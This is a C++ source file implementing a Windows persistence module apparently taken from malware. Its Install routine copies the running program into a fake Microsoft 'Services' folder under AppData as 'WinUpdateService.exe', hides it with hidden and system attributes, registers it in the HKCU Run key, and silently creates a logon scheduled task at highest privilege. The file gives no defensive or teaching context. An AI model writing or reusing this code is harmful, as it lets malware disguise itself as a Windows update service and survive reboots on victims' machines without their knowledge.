#include "persistence.h"
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

namespace Persistence {

    bool Install() {
        char exePath[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, exePath, MAX_PATH);

        char appData[MAX_PATH] = {};
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData)))
            return false;

        std::string destDir = std::string(appData) + "\\Microsoft\\Windows\\Services";
        std::string destPath = destDir + "\\WinUpdateService.exe";

        CreateDirectoryA(destDir.c_str(), nullptr);

        // Copy self to destination if not already there
        if (_stricmp(exePath, destPath.c_str()) != 0) {
            CopyFileA(exePath, destPath.c_str(), FALSE);
            SetFileAttributesA(destPath.c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        // --- Registry Run key ---
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WinUpdateService", 0, REG_SZ,
                reinterpret_cast<const BYTE*>(destPath.c_str()),
                static_cast<DWORD>(destPath.length() + 1));
            RegCloseKey(hKey);
        }

        // --- Scheduled Task (fallback) ---
        std::string schCmd = "schtasks /create /tn \"WinUpdateService\" /tr \"" +
            destPath + "\" /sc onlogon /rl highest /f";
        WinExec(schCmd.c_str(), SW_HIDE);

        return true;
    }

    bool Remove() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "WinUpdateService");
            RegCloseKey(hKey);
        }

        WinExec("schtasks /delete /tn \"WinUpdateService\" /f", SW_HIDE);
        return true;
    }

    bool IsInstalled() {
        HKEY hKey;
        bool exists = false;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            exists = (RegQueryValueExA(hKey, "WinUpdateService", nullptr,
                nullptr, nullptr, nullptr) == ERROR_SUCCESS);
            RegCloseKey(hKey);
        }
        return exists;
    }

} // namespace Persistence